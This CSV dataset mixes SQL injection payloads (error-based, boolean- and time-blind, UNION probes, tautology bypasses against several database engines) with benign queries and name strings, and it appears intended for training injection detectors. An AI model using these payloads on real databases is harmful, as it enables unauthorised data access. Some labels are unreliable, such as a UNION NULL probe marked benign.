payload_norm,payload_delex,sqli_type,db_engine,confidence,is_attack,source,tier
-4308' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'jmot' = 'jmot,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,mssql,0.7,True,original,bronze
"select * from users WHERE username = ""1\' in boolean mode ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) #"" and username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'enfe\' like \'enfe""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.9,True,original,silver
SELECT * FROM grandfather WHERE policeman = 'small',select * from __IDENT__ where __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1"" and ""exgr"" like ""exgr"" or username = ""1 )",select * from __IDENT__ where __IDENT__ = __STR__ and __STR__ like __STR__ or __IDENT__ = __INT__ ),auth_bypass,generic,0.9,True,original,silver
( SELECT ProductID FROM OrderDetails WHERE Quantity = 10 ),( select __IDENT__ from __IDENT__ where __IDENT__ = __INT__ ),benign,generic,1.0,False,original,gold
"-2131"" or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""wpsf"" like ""wpsf",- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.8,True,original,silver
97925933y,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""1\' where 2389 = 2389 or username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'""",select * from __IDENT__ where __IDENT__ = __STR__,out_of_band,oracle,0.9,True,original,silver
4.71E+15,__IDENT__ + __INT__,benign,generic,0.9,False,original,silver
artigas girut,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"1 and make_set ( 9542 = 8888,8888 ) -- idkn","__INT__ and __IDENT__ ( __INT__ = __INT__ , __INT__ ) - - __IDENT__",boolean_blind,mysql,0.7,True,original,bronze
SELECT * FROM ( SELECT discuss FROM quietly ),select * from ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
"SELECT complete AS middle, welcome AS [consist] FROM terrible","select __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ from __IDENT__",benign,mysql,0.9,False,original,silver
"INSERT INTO prove ( hand, remain, teacher, chance, getting, experience ) VALUES ( 'regular', 'extra'. obtain', 'beyond', 'mirror', 'zoo', 'search' )","insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__ . __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ __IDENT__ )",benign,generic,1.0,False,original,gold
"select * from users where id = 1 or ""]{"" or 1 = 1 -- 1",select * from __IDENT__ where __IDENT__ = __INT__ or __STR__ or __INT__ = __INT__ - - __INT__,boolean_blind,mysql,0.85,True,original,silver
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""1\' ) ) ) and ( ( ( \'iuki\' = \'iuki""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.8,True,original,silver
"select * from users WHERE username = ""-6353%\' ) ) or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1\'|| ( select \'rjun\' where 8868 = 8868","select * from __IDENT__ where __IDENT__ = "" - __INT__ % \ __STR__ | | ( select \ __STR__ where __INT__ = __INT__",error_based,oracle,0.95,True,original,gold
"-5082 ) ) union all select 4013,4013,4013,4013,4013,4013,4013,4013,4013,4013#","- __INT__ ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__",union_based,generic,0.7,True,original,bronze
"select * from users WHERE username = ""1\'|| ( select \'ylio\' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||\'"" and username = ""1\'|| ( select \'yucg\' where 2576 = 2576",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __INT__ __STR__ __IDENT__ where __INT__ = __INT__,error_based,oracle,0.9,True,original,silver
end and ( ( ( 'ycte' = 'ycte,end and ( ( ( __STR__ = __IDENT__,boolean_blind,generic,0.5,True,original,bronze
"select * from users WHERE username = ""-7746\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'abcf\' like \'abcf""",select * from __IDENT__ where __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
mbrose,__IDENT__,benign,generic,0.9,False,original,silver
"UPDATE group SET tongue = 'bus', City = 'directly' WHERE we = seen","update group set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",benign,generic,1.0,False,original,gold
SELECT heard FROM single UNION ALL SELECT vapor FROM tail ORDER BY solution,select __IDENT__ from __IDENT__ union all select __IDENT__ from __IDENT__ order by __IDENT__,benign,generic,1.0,False,original,gold
barrera medio,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
planthar,__IDENT__,benign,generic,0.9,False,original,silver
"-4811' ) ) ) union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--","- __INT__ ) ) ) union all select __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ - -",union_based,generic,0.7,True,original,bronze
SELECT * FROM occur 3,select * from __IDENT__ __INT__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) ) ) and ( ( ( \'mfmk\' = \'mfmk"" and username = ""-2181\' ) and ( \'wyez\' = \'wyez""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,auth_bypass,generic,0.6,True,original,bronze
"SELECT TIME_TO_SEC ( ""-03:30:00"" ) ;",select __IDENT__ ( __STR__ ) ;,benign,mysql,0.9,False,original,silver
SELECT * FROM visitor WHERE once = somewhere,select * from __IDENT__ where __IDENT__ = __IDENT__,benign,generic,1.0,False,original,gold
"1 ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( 3003 = 3003","__INT__ ) ) or __INT__ = ( select count ( * ) from __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ , __IDENT__ as __IDENT__ ) and ( ( __INT__ = __INT__",heavy_query,mssql,0.7,True,original,bronze
"1"" ) ) ) union all select null,null,null,null--","__INT__ ) ) ) union all select null , null , null , null - -",benign,generic,1.0,False,original,gold
"1%' ) ) ) union all select null,null,null,null,null,null,null,null,null--","__INT__ % ' ) ) ) union all select null , null , null , null , null , null , null , null , null - -",union_based,generic,0.7,True,original,bronze
"SELECT * FROM users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 AND username = ""-7430\' ) as xfah where 1596 = 1596",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) as __IDENT__ where __INT__ = __INT__,auth_bypass,generic,0.5,True,original,bronze
rosngela,__IDENT__,benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-1254"" and username = ""-3899\' ) where 8152 = 8152 and username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) """,select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ __INT__ __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\'+ ( select \'kicv\' where 1976 = 1976 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) +\'"" and username = ""-8007\' ) ) as bgpp where 9555 = 9555","select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = "" - __INT__ ) ) as __IDENT__ where __INT__ = __INT__",error_based,oracle,0.9,True,original,silver
"1' and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and 'dubu' like 'dubu",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,oracle,0.9,True,original,silver
"SELECT LOCATE ( ""a"", CustomerName ) FROM Customers;","select __IDENT__ ( __STR__ , __IDENT__ ) from __IDENT__ ;",benign,mysql,0.9,False,original,silver
olascoaga huix,__IDENT__ __IDENT__,benign,generic,0.9,False,original,silver
"SELECT RTRIM ( ""SQL Tutorial "" ) AS RightTrimmedString;",select rtrim ( __STR__ ) as __IDENT__ ;,benign,mysql,0.9,False,original,silver
"select * from users WHERE username = ""1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-3859 ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ""","select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = __IDENT__ ( __INT__ , ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) and __IDENT__ = __STR__",error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-1254"" and ( 3530 = 3530"" or username = ""-3733\' ) ) or username = ""-6190\' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ and ( __INT__ = __INT__ __STR__ - __INT__ __STR__ ) where __INT__ = __INT__ or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""1\' ) ) as plbt where 4368 = 4368",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ) as __IDENT__ where __INT__ = __INT__,out_of_band,oracle,0.9,True,original,silver
"select * from users WHERE username = ""-6523"" and username = ""-5062 ) where 7457 = 7457 or username = ""-3424\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__ - __INT__ ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.9,True,original,silver
evarist arnus 5 11-d,__IDENT__ __IDENT__ __INT__ __INT__ - __IDENT__,benign,generic,0.9,False,original,silver
SELECT TOP 3 * FROM yellow,select top __INT__ * from __IDENT__,benign,mysql,0.9,False,original,silver
86704903d,__IDENT__,benign,generic,0.9,False,original,silver
harlin,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM farther WHERE NOT determine = 'began' AND NOT sink = 'fully',select * from __IDENT__ where not __IDENT__ = __STR__ and not __IDENT__ = __STR__,benign,mysql,0.9,False,original,silver
01062744y,__IDENT__,benign,generic,0.9,False,original,silver
"1"" ) where 4951 = 4951",__INT__ ) where __INT__ = __INT__,boolean_blind,generic,0.5,True,original,bronze
"SELECT street, money+ ', ' + factory+ ' ' + leather+ ', ' + topic AS smoke FROM stepped","select __IDENT__ , __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ + __STR__ + __IDENT__ as __IDENT__ from __IDENT__",benign,generic,1.0,False,original,gold
"1"" ) ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( ( ""isbh"" like ""isbh",__INT__ __STR__ __IDENT__ __STR__ __IDENT__,time_blind,postgresql,0.7,True,original,bronze
"UPDATE hurried SET definition = 'lungs', City = 'statement' WHERE tea = problem","update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",benign,generic,1.0,False,original,gold
UPDATE thread SET tool = 'surprise'WHERE fighting = 'clothes',update __IDENT__ set __IDENT__ = __STR__ where __IDENT__ = __STR__,benign,generic,1.0,False,original,gold
-2036' ) or ( 8459 = 8459 ) *4906 and ( 'hjeu' = 'hjeu,- __INT__ __STR__ __IDENT__ __STR__ __IDENT__,boolean_blind,generic,0.5,True,original,bronze
"1%"" ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ""%"" = """,__INT__ % __STR__ % __STR__,boolean_blind,mysql,0.8,True,original,silver
"select * from users WHERE username = ""1 and username = ""1\' ) and ( \'rjjo\' = \'rjjo"" or username = ""-4952\' ) ) ) and ( ( ( \'abso\' = \'abso""",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ __STR__ __IDENT__ __STR__ __IDENT__ __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,auth_bypass,generic,0.6,True,original,bronze
"select * from users WHERE username = ""1 ) ) or username = ""-4173\' ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( \'jdwt\' like \'jdwt""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ __STR__ __IDENT__ __STR__ __IDENT__,error_based,oracle,0.9,True,original,silver
"-2033"" ) or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #","- __INT__ ) or __INT__ group by concat ( __HEX__ , ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) ) , __HEX__ , floor ( __IDENT__ ( __INT__ ) * __INT__ ) ) having min ( __INT__ ) #",error_based,mysql,0.9,True,original,silver
SELECT * FROM Customers WHERE City LIKE '_ondon',select * from __IDENT__ where __IDENT__ like __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and username = ""-6203\' ) ) )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) ),error_based,oracle,0.9,True,original,silver
"select * from users WHERE username = ""1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1 ) ) ) and ( ( ( 6395 = 6395""",select * from __IDENT__ where __IDENT__ = __STR__ and __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ) __STR__ __INT__ ) ) ) and ( ( ( __INT__ = __INT__,error_based,oracle,0.95,True,original,gold
"-4072%"" ) ) ) or 3999 = 1979","- __INT__ % "" ) ) ) or __INT__ = __INT__",boolean_blind,generic,0.5,True,original,bronze
haewon7,__IDENT__,benign,generic,0.9,False,original,silver
SELECT AVG ( cent ) FROM slipped SELECT SUM ( mind ),select avg ( __IDENT__ ) from __IDENT__ select sum ( __IDENT__ ),benign,generic,1.0,False,original,gold
SELECT * FROM neighborhood WHERE teeth IN ( SELECT island FROM warm ),select * from __IDENT__ where __IDENT__ in ( select __IDENT__ from __IDENT__ ),benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""-4248 where 3288 = 3288 or username = ""-3880 ) or username = ""-7199\' or \'qibr\' = \'qibr""",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) or __IDENT__ = __STR__,auth_bypass,generic,0.5,True,original,bronze
"select * from users WHERE username = ""-7430\' ) as xfah where 1596 = 1596 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""1 where 8214 = 8214 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --""",select * from __IDENT__ where __IDENT__ = __STR__ and __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""1\'|| ( select \'adiv\' from dual where 9842 = 9842 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||\'"" or username = ""-3185\' ) ) and ( ( \'rknd\' like \'rknd""",select * from __IDENT__ where __IDENT__ = __STR__ or __IDENT__ = __STR__,error_based,oracle,0.95,True,original,gold
SELECT * FROM thread WHERE strong NOT LIKE 'any%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,generic,1.0,False,original,gold
SELECT * FROM practical WHERE every NOT LIKE '[calm]%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,generic,1.0,False,original,gold
"select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 ) or username = ""1%\' ) )",select * from __IDENT__ where __IDENT__ = __INT__ __STR__ ) ),error_based,oracle,0.95,True,original,gold
SELECT COUNT ( distantID ) FROM born,select count ( __IDENT__ ) from __IDENT__,benign,generic,1.0,False,original,gold
graciano,__IDENT__,benign,generic,0.9,False,original,silver
pravia,__IDENT__,benign,generic,0.9,False,original,silver
select ( case when ( 1039 = 5127 ) then 1039 else 1039* ( select 1039 from information_schema.character_sets ) end ) #,select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ * ( select __INT__ from __IDENT__ ) end ) #,boolean_blind,mysql,0.8,True,original,silver
SELECT * FROM several WHERE instance NOT BETWEEN 'lay' AND 'ran',select * from __IDENT__ where __IDENT__ not between __STR__ and __STR__,benign,generic,1.0,False,original,gold
"calle tiberiades, 90, 8-f","__IDENT__ __IDENT__ , __INT__ , __INT__ - __IDENT__",benign,generic,0.9,False,original,silver
"select * from users WHERE username = ""-4952\' ) ) ) or username = ""-1854\' ) as fmmq where 7326 = 7326 or username = ""-4610\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",select * from __IDENT__ where __IDENT__ = __STR__ - __INT__ ) ) or __INT__ = ( select upper ( __IDENT__ ( chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | ( select ( case when ( __INT__ = __INT__ ) then __INT__ else __INT__ end ) from dual ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) | | chr ( __INT__ ) ) ) from dual ),error_based,oracle,0.95,True,original,gold
"select * from users WHERE username = ""-6353%\' ) ) or username = ""1 ) ) ) and username = ""1",select * from __IDENT__ where __IDENT__ = __STR__ __INT__ ) ) ) and __IDENT__ = __INT__,auth_bypass,generic,0.6,True,original,bronze
SELECT * FROM thee WHERE shaking NOT LIKE '[kill]%',select * from __IDENT__ where __IDENT__ not like __STR__,benign,mysql,0.9,False,original,silver
"SELECT SUBSTRING ( ""SQL Tutorial"", -5, 5 ) AS ExtractString;","select substring ( __STR__ , - __INT__ , __INT__ ) as __IDENT__ ;",benign,mysql,0.9,False,original,silver
pente@maxitienda.ms,__IDENT__,benign,generic,0.9,False,original,silver
SELECT * FROM brother WHERE dirty = 'apple' LIMIT 3,select * from __IDENT__ where __IDENT__ = __STR__ limit __INT__,benign,generic,1.0,False,original,gold
""" ) or true--",""" ) or true - -",boolean_blind,generic,0.9,True,original,silver
